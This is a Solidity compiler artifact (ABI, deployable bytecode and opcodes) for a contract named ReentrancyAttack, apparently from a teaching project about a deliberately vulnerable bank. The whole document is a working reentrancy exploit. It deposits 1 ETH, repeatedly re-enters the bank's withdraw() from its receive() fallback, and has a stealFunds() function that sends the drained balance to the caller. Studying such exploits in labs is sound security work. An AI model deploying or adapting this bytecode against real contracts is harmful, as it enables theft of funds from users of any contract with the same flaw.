{"contracts/ReentrancyAttack.sol":{"ReentrancyAttack":{"abi":[{"inputs":[{"internalType":"address","name":"_bankAddress","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"attack","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"bank","outputs":[{"internalType":"contract IVulnerableBank","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"stealFunds","outputs":[],"stateMutability":"nonpayable","type":"function"},{"stateMutability":"payable","type":"receive"}],"evm":{"bytecode":{"linkReferences":{},"object":"608060405234801561001057600080fd5b5060405161033338038061033383398101604081905261002f91610054565b600080546001600160a01b0319166001600160a01b0392909216919091179055610084565b60006020828403121561006657600080fd5b81516001600160a01b038116811461007d57600080fd5b9392505050565b6102a0806100936000396000f3fe6080604052600436106100385760003560e01c806376cdb03b146100bb5780639e5faafc146100f7578063d5599f2e146100ff57600080fd5b366100b657600054670de0b6b3a76400006001600160a01b0390911631106100b4576000805460408051633ccfd60b60e01b815290516001600160a01b0390921692633ccfd60b9260048084019382900301818387803b15801561009b57600080fd5b505af11580156100af573d6000803e3d6000fd5b505050505b005b600080fd5b3480156100c757600080fd5b506000546100db906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b6100b4610114565b34801561010b57600080fd5b506100b461023b565b670de0b6b3a76400003410156101705760405162461bcd60e51b815260206004820152601d60248201527f4e656564206174206c6561737420312045544820746f2061747461636b000000604482015260640160405180910390fd5b60008054906101000a90046001600160a01b03166001600160a01b031663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b1580156101c657600080fd5b505af11580156101da573d6000803e3d6000fd5b50506000805460408051633ccfd60b60e01b815290516001600160a01b039092169550633ccfd60b9450600480820194509082900301818387803b15801561022157600080fd5b505af1158015610235573d6000803e3d6000fd5b50505050565b60405133904780156108fc02916000818181858888f19350505050158015610267573d6000803e3d6000fd5b5056fea2646970667358221220002b84fe3bda1ca967b3b63ad70158b4260b1e953bb6f0ba6d763ee6ad7a308264736f6c63430008130033","opcodes":"PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x333 CODESIZE SUB DUP1 PUSH2 0x333 DUP4 CODECOPY DUP2 ADD PUSH1 0x40 DUP2 SWAP1 MSTORE PUSH2 0x2F SWAP2 PUSH2 0x54 JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP3 SWAP1 SWAP3 AND SWAP2 SWAP1 SWAP2 OR SWAP1 SSTORE PUSH2 0x84 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x66 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND DUP2 EQ PUSH2 0x7D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH2 0x2A0 DUP1 PUSH2 0x93 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x38 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x76CDB03B EQ PUSH2 0xBB JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0xF7 JUMPI DUP1 PUSH4 0xD5599F2E EQ PUSH2 0xFF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST CALLDATASIZE PUSH2 0xB6 JUMPI PUSH1 0x0 SLOAD PUSH8 0xDE0B6B3A7640000 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND BALANCE LT PUSH2 0xB4 JUMPI PUSH1 0x0 DUP1 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x3CCFD60B PUSH1 0xE0 SHL DUP2 MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND SWAP3 PUSH4 0x3CCFD60B SWAP3 PUSH1 0x4 DUP1 DUP5 ADD SWAP4 DUP3 SWAP1 SUB ADD DUP2 DUP4 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x9B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xAF JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xC7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x0 SLOAD PUSH2 0xDB SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xB4 PUSH2 0x114 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x10B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xB4 PUSH2 0x23B JUMP JUMPDEST PUSH8 0xDE0B6B3A7640000 CALLVALUE LT ISZERO PUSH2 0x170 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1D PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x4E656564206174206C6561737420312045544820746F2061747461636B000000 PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0xD0E30DB0 PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1C6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1DA JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x0 DUP1 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x3CCFD60B PUSH1 0xE0 SHL DUP2 MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND SWAP6 POP PUSH4 0x3CCFD60B SWAP5 POP PUSH1 0x4 DUP1 DUP3 ADD SWAP5 POP SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP4 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x221 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x235 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x40 MLOAD CALLER SWAP1 SELFBALANCE DUP1 ISZERO PUSH2 0x8FC MUL SWAP2 PUSH1 0x0 DUP2 DUP2 DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x267 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 STOP 0x2B DUP5 INVALID EXTCODESIZE 0xDA SHR 0xA9 PUSH8 0xB3B63AD70158B426 SIGNEXTEND 0x1E SWAP6 EXTCODESIZE 0xB6 CREATE 0xBA PUSH14 0x763EE6AD7A308264736F6C634300 ADDMOD SGT STOP CALLER "},"methodIdentifiers":{"attack()":"9e5faafc","bank()":"76cdb03b","stealFunds()":"d5599f2e"}}}}}